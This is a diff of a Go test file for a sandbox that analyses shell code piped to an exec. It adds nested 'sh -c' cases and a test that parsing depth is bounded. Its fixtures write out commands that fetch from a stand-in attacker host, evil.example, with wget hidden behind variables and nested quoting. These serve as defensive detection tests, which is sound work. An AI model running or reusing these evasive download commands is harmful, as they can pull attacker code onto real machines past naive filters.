@@ -555,6 +555,8 @@ func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
 				{[]string{"W=wget"}, "$W https://evil.example/x </dev/null\n"},
 				// The shell sets PWD itself, whatever the exec says.
 				{[]string{"PWD=ls"}, "$PWD -la </dev/null\n"},
+				{nil, "sh -c \"sh -c 'c=wget; \\$c https://evil.example/x'\" </dev/null\n"},
+				{nil, "sh -c \"bash -c \\\"sh -c 'c=wget; \\\\\\$c https://evil.example/x'\\\"\" </dev/null\n"},
 				// A child shell does not get a variable the script did not export.
 				{nil, "c=echo; sh -c '$c wget https://evil.example/x' </dev/null\n"},
 				{nil, "c=echo\nsh -c '$c wget https://evil.example/x' </dev/null\n"},
@@ -576,5 +578,17 @@ func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
 				t.Fatalf("a readable script: %+v %+v", got, got.Error)
 			}
 		})
+	}
+}
+
+// Shells' -c texts are read inside one another to a bound, and refused past it.
+func TestStdinShellCodeDepthIsBounded(t *testing.T) {
+	w := &scriptWalk{sc: newStdinScript(), depth: maxShellDepth - 1}
+	if w.shellCode("sh", "ls", nil); w.why != "" {
+		t.Fatalf("within the bound: %s", w.why)
+	}
+	w = &scriptWalk{sc: newStdinScript(), depth: maxShellDepth}
+	if w.shellCode("sh", "ls", nil); !strings.Contains(w.why, "deep") {
+		t.Fatalf("past the bound: %q", w.why)
 	}
 }
